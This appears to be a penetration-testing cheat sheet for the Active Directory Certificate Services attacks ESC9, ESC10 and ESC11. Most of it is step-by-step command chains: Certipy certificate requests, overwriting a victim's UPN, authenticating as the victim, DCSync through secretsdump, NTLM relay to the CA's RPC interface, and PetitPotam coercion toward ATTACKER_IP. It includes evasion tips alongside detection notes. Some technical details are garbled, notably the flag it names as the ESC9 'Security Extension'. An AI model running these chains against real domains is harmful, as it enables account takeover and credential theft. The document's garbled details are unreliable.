# ESC9, ESC10, ESC11 — Weak Issuance & NTLM Relay Variants

---

# ESC9 — No Security Extension

## What It Is

ESC9 exploits the **absence of the `msPKI-Enrollment-Flag` with the `INCLUDE_SYMMETRIC_ALGORITHMS` flag** (also called the Security Extension). When a certificate template does **not** include the Security Extension, the `strongCertificateBindingEnforcement` check on the Domain Controller has no certificate policy to validate.

More specifically, ESC9 requires:
1. A template that does **not** have the Security Extension (`CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS` is NOT set — this flag is set by default on V2 templates but can be removed)
2. The user has **`GenericWrite`** rights on the victim user
3. The victim user has **`UserPrincipalName`** set (or a UPN that the attacker can read/control)

## Why It Works

- When a certificate lacks the Security Extension (which includes the hashed subject public key info), the domain controller cannot properly map the certificate to a user object
- The attacker can manipulate the victim's UPN (`userPrincipalName`) to match a certificate they already have
- The certificate is then accepted for authentication because the DC can't verify the strong binding
- This bypasses `StrongCertificateBindingEnforcement` requirement for strong certificate-to-user mapping

## Prerequisites

- Domain credentials
- A certificate template without the Security Extension
- `GenericWrite` (or `WriteProperty` on `userPrincipalName`) against a victim user
- Ability to request a certificate from the vulnerable template

## Exploitation — Certipy

### Step 1: Find Vulnerable Templates (ESC9)

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout
```

Look for: `ESC9 - No Security Extension`

### Step 2: Find a Victim with User Write Access

```bash
# Use BloodHound or manual ACL checks
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Check for `GenericWrite` / `WriteOwner` / `WriteDacl` on other users.

### Step 3: Request Certificate for Yourself

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplateNoSecurityExt' -upn 'user@domain.local' -dc-ip 192.168.1.10
```

### Step 4: Modify Victim's UPN to Match Your Certificate

```bash
# You need GenericWrite on the victim user to do this
# Certipy can do this with:
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'victim' -upn 'user@domain.local' -dc-ip 192.168.1.10
```

### Step 5: Authenticate as Victim Using Your Certificate

```bash
certipy auth -pfx 'user.pfx' -domain 'domain.local' -username 'victim' -dc-ip 192.168.1.10
```

The DC accepts the certificate for the victim because:
- The victim's UPN now matches the certificate's UPN
- The certificate has no Security Extension
- Strong mapping enforcement can't validate the binding

## Exploitation — Full ESC9 Chain

```bash
# 1. Find vulnerable templates
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout

# 2. Enumerate ACLs to find writable users
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout

# 3. Get a certificate for yourself
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'ESC9-Template' -upn 'user@domain.local' -dc-ip 192.168.1.10

# 4. Update victim's UPN to match
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'victim-user' -upn 'user@domain.local' -dc-ip 192.168.1.10

# 5. Authenticate as victim
certipy auth -pfx 'user.pfx' -domain 'domain.local' -username 'victim-user' -dc-ip 192.168.1.10

# 6. Restore victim's UPN (OPSEC) - use original UPN
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'victim-user' -upn 'victim@domain.local' -dc-ip 192.168.1.10
```

## OPSEC — ESC9

- Modifying a user's `userPrincipalName` generates **Event ID 5136**
- The UPN change could cause login issues for the victim (services/apps relying on UPN)
- Must restore the original UPN to avoid detection and operational impact
- Certificate requests still generate standard 4886/4887 events

## Detection — ESC9

- **Event ID 5136**: Changes to `userPrincipalName` on user objects — especially if changed to a different user's UPN
- Look for patterns: UPN changed → certificate issued for the new UPN → UPN changed back
- Audit templates for missing Security Extension flags
- Check `StrongCertificateBindingEnforcement` audit logs (`Event ID 4768` with status `0x1F`)

---

# ESC10 — Weak StrongCertificateBindingEnforcement

## What It Is

ESC10 involves the Domain Controller's **`StrongCertificateBindingEnforcement`** registry value. This setting controls how strictly the DC maps certificates to user objects during PKINIT authentication. The possible values:

| Value | Behavior | Security |
|-------|----------|----------|
| `0` | **Disabled** — No strong mapping required. Certificates with any UPN (or even no UPN) can be mapped to any user with the same UPN | Very weak |
| `1` | **Audit only** — Certificate is accepted but a warning event is logged | Weak |
| `2` (default in modern DCs) | **Enforce** — Strong mapping is required. Certificates must have the Security Extension with correct SID/UPN binding | Secure |

When set to `0` or `1`, an attacker can use a certificate for **any user whose UPN is set in the certificate**, bypassing the strong binding requirements.

## Why It Works

- With `StrongCertificateBindingEnforcement = 0`, the DC doesn't verify that the certificate cryptographically binds to the user's AD object
- An attacker can enroll for a certificate with their own UPN, then change the victim's UPN to match (or use any certificate that includes the victim's UPN)
- The DC issues a TGT for the victim based on the certificate's UPN match alone
- This effectively disables the built-in PKINIT security

## Prerequisites

- Domain credentials with enrollment rights on any template
- Registry value `StrongCertificateBindingEnforcement` set to `0` or `1` on the target domain controller
- Access to a certificate that includes the target user's UPN (or ability to create one via ESC1/ESC6 or modify victim's UPN)

## Exploitation

### Step 1: Check StrongCertificateBindingEnforcement

```bash
# Remote registry query (requires admin on DC or domain admin)
reg query "\\dc.domain.local\HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement

# Or check via LDAP/Group Policy if configured
```

### Step 2: If Value is 0 or 1

The exact exploitation depends on how you can obtain a certificate with the victim's UPN:

**If ESC1 or ESC6 is also available:**

```bash
# Just request a cert with target's UPN
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'User' -upn 'administrator@domain.local' -dc-ip 192.168.1.10
certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.1.10
```

**If you have GenericWrite on the target user and any template:**

```bash
# 1. Request cert for yourself
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'User' -upn 'attacker@domain.local' -dc-ip 192.168.1.10

# 2. Set victim's UPN to attacker's UPN
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'victim' -upn 'attacker@domain.local' -dc-ip 192.168.1.10

# 3. Authenticate as victim with attacker's cert
certipy auth -pfx 'attacker.pfx' -domain 'domain.local' -username 'victim' -dc-ip 192.168.1.10

# 4. Restore victim's UPN
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'victim' -upn 'victim@domain.local' -dc-ip 192.168.1.10
```

### Step 3: Full Chain (ESC10 + GenericWrite)

```bash
# 1. Enumerate
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout

# 2. Get cert for self
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'User' -upn 'attacker@domain.local' -dc-ip 192.168.1.10

# 3. Overwrite target's UPN
certipy account update -u 'user@domain.local' -p 'Password123!' -user 'target_admin' -upn 'attacker@domain.local' -dc-ip 192.168.1.10

# 4. Auth as target
certipy auth -pfx 'attacker.pfx' -domain 'domain.local' -username 'target_admin' -dc-ip 192.168.1.10

# 5. DCSync
impacket-secretsdump 'domain/target_admin@dc.domain.local' -hashes LMHASH:NTHASH
```

## OPSEC — ESC10

- `StrongCertificateBindingEnforcement` is a **registry setting** on each DC — changing it is extremely noisy
- ESC10 is typically **leveraged passively** (finding it set to 0), not changed by the attacker
- Modifying UPN on a high-value account (e.g. Domain Admin) is highly suspicious
- Check with BloodHound whether your user has `GenericWrite` on high-value targets

## Detection — ESC10

- **Event ID 4768** (Kerberos TGT request) with **Certificate Required** — domain controllers with `StrongCertificateBindingEnforcement = 1` will log warnings
- Check for `0x1F` status codes (KDC_ERR_CERTIFICATE_MAPPING_NOT_UNIQUE) in authentication logs
- **Event ID 5136**: Changes to `userPrincipalName` — especially on privileged accounts
- Regularly audit `StrongCertificateBindingEnforcement` across domain controllers
- Default (secure) value is `2` — any deviation should be investigated

---

# ESC11 — NTLM Relay to ICERTPASS

## What It Is

ESC11 exploits the **ICERTPASS RPC interface** (used for certificate enrollment over RPC). Like ESC8 which targets HTTP enrollment, ESC11 relays NTLM authentication to the RPC endpoint of the Certificate Services.

The ICERTPASS interface is exposed via the **MS-ICPR** protocol (Certificate Enrollment via RPC). If:
- The CA does not enforce **Extended Protection for Authentication (EPA)** on the RPC interface
- NTLM authentication is accepted (not disabled)
- The attacker can coerce NTLM auth from a victim machine

...then the attacker can relay the victim's NTLM authentication to request a certificate on their behalf.

## Why It Works

- The RPC interface (`ICertPassage`) is used for remote certificate enrollment
- Unlike HTTP, RPC is often not scrutinized for relay attacks
- The enrollment endpoint processes NTLM tokens embedded in RPC packets
- Without EPA/channel binding, the relayed authentication is accepted as valid

## Prerequisites

- Network access to the CA server on RPC endpoints (TCP 135, dynamic RPC ports)
- Ability to coerce NTLM auth from a victim (PetitPotam, PrinterBug, etc.)
- The CA must have the RPC enrollment interface enabled (default)
- Impacket with AD CS support (recent versions include ESC11)

## Exploitation — ntlmrelayx with RPC Target

### Step 1: Identify CA RPC Endpoint

```bash
# The CA's RPC enrollment endpoint is typically on the same server as the CA
# Use rpcdump or impacket's rpcmap to check
impacket-rpcdump 'CA-SERVER.domain.local' | grep -i "ICertPassage"
```

### Step 2: Start NTLM Relay to RPC Endpoint

```bash
impacket-ntlmrelayx -t 'rpc://CA-SERVER.domain.local/ICertPassage' -smb2support --adcs --template 'DomainController'
```

Key differences from ESC8:
- Target is `rpc://` instead of `http://`
- The endpoint is `ICertPassage` (the RPC interface name)

### Step 3: Coerce Authentication

Same as ESC8 — trigger NTLM auth from the target:

```bash
# Terminal 2: PetitPotam
python3 PetitPotam.py -u 'user@domain.local' -p 'Password123!' 'ATTACKER_IP' 'TARGET_IP'

# Or Printer Bug
python3 printerbug.py 'domain.local/user:Password123!@TARGET' 'ATTACKER_IP'
```

### Step 4: Capture and Authenticate

```bash
# Save the base64 certificate from ntlmrelayx output
echo 'BASE64CERT' | base64 -d > target.pfx

# Authenticate
certipy auth -pfx target.pfx -dc-ip 192.168.1.10
```

## When to Use ESC11 Instead of ESC8

| Scenario | Use |
|----------|-----|
| Web Enrollment (certsrv) is disabled | ESC11 |
| Web Enrollment is HTTPS with proper validation | ESC11 (RPC may still work) |
| Web Enrollment has Extended Protection for Authentication | ESC11 may still work if RPC doesn't enforce EPA |
| Firewall blocks HTTP but RPC is open | ESC11 |
| Both available | Try ESC8 first (simpler), then ESC11 |

## Full ESC11 Chain

```bash
# Terminal 1: Relay
impacket-ntlmrelayx -t 'rpc://CA-SERVER.domain.local/ICertPassage' -smb2support --adcs --template 'DomainController'

# Terminal 2: Coerce
python3 PetitPotam.py -u 'domain.local\user' -p 'Password123!' '10.0.0.5' '10.0.0.1'

# Terminal 1 output captured → cert
echo 'BASE64CERT' > cert.b64
base64 -d cert.b64 > cert.der
openssl x509 -inform DER -in cert.der -out cert.pem
# Or directly use with certipy
certipy auth -pfx cert.pfx -dc-ip 10.0.0.1
```

## OPSEC — ESC11

- RPC traffic may be subject to network monitoring and firewall rules
- Dynamic RPC ports (1024-5000 or 49152-65535) make it harder to monitor, but also sometimes blocked
- The coercion (PetitPotam) is the noisiest part — same events as ESC8
- RPC-based certificate enrollment may be less monitored than HTTP enrollment

## Detection — ESC11

- **Event ID 4886/4887**: Certificate requests from unexpected sources via RPC
- Monitor RPC connections to the CA server (Event ID 5156 — connection events)
- Look for **NTLM authentication** to Certificate Service RPC endpoints from non-CA servers
- Enable **EPA on RPC** for the CA server (via registry or Group Policy)
- **Event ID 4648**: A logon was attempted using explicit credentials (may indicate relay attempts)
- Audit and restrict **RPC access** to the CA server using firewall rules
